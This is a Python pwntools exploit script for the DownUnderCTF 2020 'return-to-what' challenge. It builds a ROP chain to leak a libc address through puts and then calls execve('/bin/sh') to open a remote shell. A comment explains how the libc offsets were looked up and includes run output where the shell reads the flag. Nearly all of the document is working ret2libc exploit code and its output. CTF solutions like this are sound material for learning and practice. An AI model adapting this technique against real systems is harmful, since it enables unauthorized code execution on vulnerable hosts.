#!/usr/bin/env python3
from pwn import *
import sys

def main( host, port):
    rtwelf = ELF("./return-to-what")
    libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')

    c = remote(host, port)

    ## Consume the first two lines
    c.readline()
    c.readline()

    # 0x000000000040122b : pop rdi ; ret
    poprdi = p64(0x040122b)

    data = b'a'*0x30
    data += p64( 0xdeadbeefcafebabe)        ## rbp
    data += poprdi
    data += p64( rtwelf.symbols['got.puts'])
    data += p64( rtwelf.symbols['puts'])
    data += p64( rtwelf.symbols['vuln'])
    data += b'\n'

    input('...')
    c.send(data)

    leak = u64(c.recvuntil(b'\n', drop=True).ljust(8, b'\x00'))

    print('[LEAK] 0x%.8x' %(leak))
   
    libc.address = leak - libc.symbols['puts']
    print('[INFO] libc base = 0x%.8x' %(libc.address))

    ## consume the line
    c.readline()

    ## pointer to /bin/sh in libc
    binsh = p64(libc.address + 0x1b3e9a)

    ## 0x0000000000023e6a : pop rsi ; ret
    pop_rsi = p64(libc.address + 0x23e6a)

    ## 0x0000000000001b96 : pop rdx ; ret
    pop_rdx = p64(libc.address + 0x1b96)

    data = b'a'*0x30
    data += p64(0xdeadbeefcafebabe)   ## rbp again
    data += poprdi
    data += binsh
    data += pop_rdx
    data += p64(0)
    data += pop_rsi
    data += p64(0)
    data += p64(libc.symbols['execve'])
    data += p64(libc.symbols['exit'])     ## exit cleanly
    data += b'\n'

    c.send(data)

    c.interactive()

    c.close()

    return

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print('[USAGE] %s <target> <port>' %(sys.argv[0]))
        exit(1)

    main(sys.argv[1], int(sys.argv[2]))

'''
From exploiting shellthis I found the md5sum of libc. With the md5sum I ran this query to get some offsets:

curl -X POST -H 'Content-Type: application/json' --data '{"md5": "50390b2ae8aaa73c47745040f54e602f"}' 'https://libc.rip/api/find'

[
  {
    "buildid": "b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0",
    "download_url": "https://libc.rip/download/libc6_2.27-3ubuntu1_amd64.so",
    "id": "libc6_2.27-3ubuntu1_amd64",
    "md5": "50390b2ae8aaa73c47745040f54e602f",
    "sha1": "18292bd12d37bfaf58e8dded9db7f1f5da1192cb",
    "sha256": "cd7c1a035d24122798d97a47a10f6e2b71d58710aecfd392375f1aa9bdde164d",
    "symbols": {
      "__libc_start_main_ret": "0x21b97",
      "dup2": "0x1109a0",
      "printf": "0x64e80",
      "puts": "0x809c0",
      "read": "0x110070",
      "str_bin_sh": "0x1b3e9a",
      "system": "0x4f440",
      "write": "0x110140"
    }
  }
]

With the offsets I went to the https://libc.rip site and downloaded the correct libc.

I leaked a pointer from libc and the lower three nybbles correspond to the expected offset of puts

[*] '/vagrant/ctf/down_under_ctf_2020/pwn/return_to_what/return-to-what'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/vagrant/ctf/down_under_ctf_2020/pwn/return_to_what/libc6_2.27-3ubuntu1_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chal.duc.tf on port 30003: Done
...
[LEAK] 0x7f1c494999c0
[INFO] libc base = 0x7f1c49419000
[*] Switching to interactive mode
$ ls
flag.txt
return-to-what
$ cat flag.txt
DUCTF{ret_pUts_ret_main_ret_where???}
'''
